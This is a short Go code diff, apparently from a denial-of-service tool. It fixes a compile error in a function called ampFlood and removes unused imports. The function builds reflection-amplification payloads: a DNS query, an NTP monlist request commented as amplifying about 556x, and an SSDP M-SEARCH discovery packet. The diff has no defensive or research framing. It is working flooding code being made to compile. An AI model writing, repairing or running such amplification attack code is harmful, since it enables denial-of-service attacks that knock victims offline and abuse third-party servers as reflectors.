@@ -10,8 +10,6 @@ import (
 	"os"
 	"os/signal"
 	"runtime"
-	"strconv"
-	"strings"
 	"sync"
 	"sync/atomic"
 	"syscall"
@@ -371,7 +369,7 @@ func ampFlood(target string, port int, ampType string, concurrency int, duration
 		payload = buildDNSQuery()
 	case "ntp":
 		// NTP monlist（放大 ~556x）
-		payload = []byte{0x17, 0x00, 0x03, 0x2a} + make([]byte, 4)
+		payload = append([]byte{0x17, 0x00, 0x03, 0x2a}, make([]byte, 4)...)
 	case "ssdp":
 		payload = []byte("M-SEARCH * HTTP/1.1\r\nHost: 239.255.255.250:1900\r\nST: ssdp:all\r\nMX: 1\r\nMAN: \"ssdp:discover\"\r\n\r\n")
 	default:
